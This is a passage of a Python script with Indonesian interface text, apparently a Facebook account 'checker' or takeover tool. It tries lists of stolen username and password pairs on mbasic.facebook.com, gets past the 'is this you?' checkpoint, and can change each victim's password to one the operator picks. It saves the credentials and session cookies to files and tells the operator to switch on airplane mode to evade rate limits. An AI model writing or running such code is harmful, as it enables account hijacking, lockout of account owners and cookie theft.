	except IOError:
		exit("\n%s%s \033[0mnama file %s\033[0m tidak tersedia"%(M,til,romi))
	jalan("%s%s%s\033[0m Mode pesawatkan terlebih dahulu 5 detik "%(U,til,O))
	pw=input("\n%s%s%s \033[0mubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s%s%s \033[0mmasukan sandi %s> %s"%(U,til,O,M,K))
		if len(pw2) <= 5:
			print("%s%s sandi minimal 6 karakter "%(M,til))
		else:
			pwbaru.append(pw2)
	print("\n %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print ("%s%s%s\033[0m total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n%s%s%s \033[0mSelesai mengecek akun"%(U,til,O));jeda(0.07)
	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
	back()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰─%s \033[0mterdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n╰─ OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0makun one tab, silahkan anda login		"%(H,til))
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s╰─\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s"%(M,oh))
	else:
		print("%s╰─ \033[0mlogin gagal, silahkan cek kembali id dan kata sandi"%(M))
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36")
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	#getkey()
	login()

